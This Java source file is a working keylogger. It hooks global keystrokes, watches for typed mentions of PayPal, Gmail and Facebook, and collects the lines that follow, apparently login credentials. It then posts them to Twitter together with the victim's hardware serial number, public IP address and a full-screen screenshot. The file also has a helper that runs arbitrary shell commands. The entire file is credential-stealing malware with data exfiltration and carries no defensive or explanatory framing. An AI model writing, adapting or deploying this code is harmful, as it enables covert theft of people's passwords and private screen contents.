import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.security.SecureRandom;
import java.math.BigInteger;


import javax.imageio.ImageIO;


import twitter4j.TwitterException;

import java.net.*;

public class Main implements NativeKeyListener   {
	private String chaine ;
	public String website = "" ;
	private int upper = 0 ;
	private int maj= 0 ;
	private String facebook = "" ;	
	int face = 0 ;
public String getIp() {
		
		
		URL whatismyip = null;
		try {
			whatismyip = new URL("http://checkip.amazonaws.com");
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		BufferedReader in = null;
		try {
			in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		String ip = null;
		try {
			ip = in.readLine();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} //you get the IP as a String
		
		return ip ;
	}
	public static void main(String[] args) throws TwitterException {
		
		try {
			GlobalScreen.registerNativeHook();
		} catch(Exception e) {
			e.printStackTrace();
		}
		

		
	
		GlobalScreen.getInstance().addNativeKeyListener(new Main());
		//getCapture();
		//System.out.println(nextSessionId());

	}
	public void Detecet(String chai) throws Exception{
		if(chai.contains("pay")|(chai.contains("paypal.com")|chai.contains("gma.com")||chai.contains("gmail.com")||chai.contains("facebook.com")||chai.contains("fb.com")||chai.contains("fb")||chai.contains("fac"))||facebook.length()>1){
			//System.out.println("Taille :");
			face ++ ;
			if(face <4 ){
			
			facebook +=  chai +"|"  ; 
			} else {
				// tweet this okk
				//DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm");
				//Date date = new Date();
				
				
				if(facebook.length()< 100){
					System.out.println(facebook);
					TweetMain.tweetwithimages(Hardware4Win.getSerialNumber()+"|"+getIp()+"|"+facebook, getCapture());
				//TweetMain.Tweet(getIp()+"|"+facebook);
				face = 0 ;
				facebook = "";
				}
				
				else {
					System.out.println(facebook);
					TweetMain.tweetwithimages(Hardware4Win.getSerialNumber()+"|"+getIp()+"|"+facebook.substring(0, 100),getCapture());
					face = 0 ;
					facebook = "";
				}
				face = 0 ;
				facebook = "";
			}
			
		}
		
	}
	public String ValeurSpecial(String chai){
		
		if(maj==0) {
		if (chai.equals("Retour arrière")){
			String val = "";
			try {
			val = chaine.substring(0,chaine.length()-1); 
			return val ;} catch (Exception e){
				return "" ;
			}}
		if (chai.equals("Espace")){return " ";}
		if (chai.equals("Tab")){return "|";}
		if(chai.equals("Accent grave avec chasse")) {return "'"  ;}
		if(chai.equals("Apostrophe")) {return "\\"  ;}
		if(chai.equals("Crochet fermant")) {return "]"  ;}
		if(chai.equals("Crochet ouvrant")) {return "["  ;}
		if(chai.equals("Point-virgule")) {return ";"  ;}
		if(chai.equals("Accent aigu")) {return "/"  ;}
		if(chai.equals("Point")) {return "."  ;}
		if(chai.equals("Virgule")) {return ","  ;}
		if(chai.equals("Majvirgule")) {return "<"  ;}
		if(chai.equals("Maj1")) {return "!"  ;}
		if(chai.equals("Barre oblique inverse")) {return "`"  ;}
		if(chai.equals("Majbarre oblique inverse")) {return "~"  ;}
		
		}
		else {
			maj = 0 ;
			//System.out.println("Maj open");
			//System.out.println(chai);
			if(chai.equals("Point")) {return ">"  ;}
			if(chai.equals("Accent grave avec chasse")) {return "|"  ;}
			if(chai.equals("Point-virgule")) {return ":"  ;}
			if(chai.equals("Crochet ouvrant")) {return "{"  ;}
			if(chai.equals("Crochet fermant")) {return "}"  ;}
			if(chai.equals("Egal")) {return "+"  ;}
			if(chai.equals("Moins")) {return "_"  ;}
			if(chai.equals("0")) {return ")"  ;}
			if(chai.equals("9")) {return "("  ;}
			if(chai.equals("8")) {return "*"  ;}
			if(chai.equals("7")) {return "&"  ;}
			if(chai.equals("6")) {return "^"  ;}
			if(chai.equals("5")) {return "%"  ;}
			if(chai.equals("4")) {return "$"  ;}
			if(chai.equals("3")) {return "#"  ;}
			if(chai.equals("2")) {return "@"  ;}
			if(chai.equals("1")) {return "!"  ;}
			if(chai.equals("`")) {return "~"  ;}
			
		}
		if (chai.equals("Maj")){
			//System.out.println("Maj");
			maj = 1 ;}
		
		return chai ;
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		
		
		
		
		if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Entrée")) {
			chaine = chaine.replaceAll("null", "");
			chaine = chaine.replaceAll("maj", "");
			DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
			Date date = new Date();
			//chaine = dateFormat.format(date) + "  "+chaine ;
			try {
				Detecet(chaine) ;
			} catch (Exception e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			System.out.println(face);
			//System.out.println(chaine);
			chaine= "";
		} else {
			if(!NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Verrouillage des majuscules")){
				if(!NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Retour arrière")){
				if(upper==0) {
					
					chaine = chaine + ValeurSpecial(NativeKeyEvent.getKeyText(e.getKeyCode())).toLowerCase() ;
				}
				else {
					chaine = chaine + NativeKeyEvent.getKeyText(e.getKeyCode()) ;

				}}else {
					
					chaine = ValeurSpecial(NativeKeyEvent.getKeyText(e.getKeyCode()));
					
				}
			} 
			
			else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Verrouillage des majuscules")){
				if(upper==0){
					upper=1 ;
				} else {
					upper=0 ;
				}
			}
			
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

	public static String runCmd(String command) {
        String cmdOutput = "";
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));

            while ((s = stdInput.readLine()) != null) {
                cmdOutput += s+"\n";
            }
        }
        catch (IOException e) {
                e.printStackTrace();
                System.exit(-1);
        }
        return cmdOutput;
}

	public static String getCapture() {
		Robot robot = null;
		try {
			robot = new Robot();
		} catch (AWTException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		BufferedImage image = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
		String PathSave = "";
		try {
			 PathSave = System.getProperty("user.home")+"/Documents/"+nextSessionId()+".png";
			
			ImageIO.write(image, "png", new File(PathSave));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return PathSave ;
	}
	
		  private static SecureRandom random = new SecureRandom();

		  public static String nextSessionId() {
		    return new BigInteger(130, random).toString(32);
		  }
		
}

